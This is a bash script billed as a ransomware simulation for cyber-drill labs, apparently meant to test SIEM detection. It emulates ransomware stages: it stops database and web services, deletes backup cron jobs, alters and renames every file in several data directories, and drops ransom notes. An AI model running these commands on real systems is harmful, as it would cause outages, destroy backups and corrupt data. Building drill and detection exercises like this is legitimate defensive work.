#!/bin/bash
# Ransomware Simulation Script — For isolated cyber drill lab use only
# This script SIMULATES ransomware behavior WITHOUT actual cryptography
# Use in controlled environments only

RANSOM_EXT=".encrypted"
RANSOM_NOTE="RANSOM_NOTE.txt"
TARGET_DIRS="/opt/data1 /opt/data2 /var/lib/database /home/admin/documents"
LOG_FILE="/tmp/ransomware_activity.log"

echo "[*] Ransomware Simulation Started" | tee "$LOG_FILE"
echo "[*] Timestamp: $(date)" | tee -a "$LOG_FILE"

# Phase 1: Stop services (T1489 - Service Stop)
echo "[*] Phase 1: Stopping services..." | tee -a "$LOG_FILE"
for service in postgresql mysql httpd nginx tomcat; do
  systemctl stop "$service" 2>/dev/null && echo "[+] Stopped: $service" | tee -a "$LOG_FILE"
done

# Phase 2: Disable recovery mechanisms (T1490 - Inhibit System Recovery)
echo "[*] Phase 2: Disabling recovery..." | tee -a "$LOG_FILE"
systemctl disable --now rsync 2>/dev/null
rm -f /etc/cron.d/backup* 2>/dev/null
echo "[+] Backup jobs disabled" | tee -a "$LOG_FILE"

# Phase 3: File encryption simulation (T1486 - Data Encrypted for Impact)
echo "[*] Phase 3: Simulating file encryption..." | tee -a "$LOG_FILE"
for TARGET_DIR in $TARGET_DIRS; do
  if [ -d "$TARGET_DIR" ]; then
    find "$TARGET_DIR" -type f ! -name "*${RANSOM_EXT}" ! -name "${RANSOM_NOTE}" \
      -not -path "*/proc/*" -not -path "*/sys/*" 2>/dev/null | while read -r FILE; do
      # Simulation: append marker (NOT actual encryption)
      echo "ENCRYPTED_$(date +%s)" >> "$FILE"
      mv "$FILE" "${FILE}${RANSOM_EXT}" 2>/dev/null
      echo "[+] Encrypted: $FILE" >> "$LOG_FILE"
    done

    # Drop ransom note in each directory
    cat > "${TARGET_DIR}/${RANSOM_NOTE}" << 'EOF'
═══════════════════════════════════════════════════════════════
                    YOUR DATA HAS BEEN ENCRYPTED
═══════════════════════════════════════════════════════════════

Your files have been encrypted by ransomware.

WHAT HAPPENED:
- All critical data has been encrypted
- Your backup systems have been disabled
- We have copies of your data

WHAT TO DO:
Contact the attacker (details redacted for lab use)

TIMELINE:
Deadline: 72 hours

DO NOT:
- Delete encrypted files
- Try third-party decryption
- Contact law enforcement (cannot help)

═══════════════════════════════════════════════════════════════
EOF
    echo "[+] Ransom note dropped: ${TARGET_DIR}/${RANSOM_NOTE}" | tee -a "$LOG_FILE"
  fi
done

# Phase 4: Create visible indicator
cat > /root/SYSTEM_ENCRYPTED.txt << 'EOF'
╔═══════════════════════════════════════════════════════════════╗
║                    SYSTEM HAS BEEN ENCRYPTED                  ║
║                                                               ║
║  All critical data has been encrypted by ransomware.          ║
║  This is a SIMULATION for drill purposes only.                ║
╚═══════════════════════════════════════════════════════════════╝
EOF

echo "[*] Ransomware simulation COMPLETE!" | tee -a "$LOG_FILE"
echo "[*] Check SIEM dashboard for detection alerts" | tee -a "$LOG_FILE"
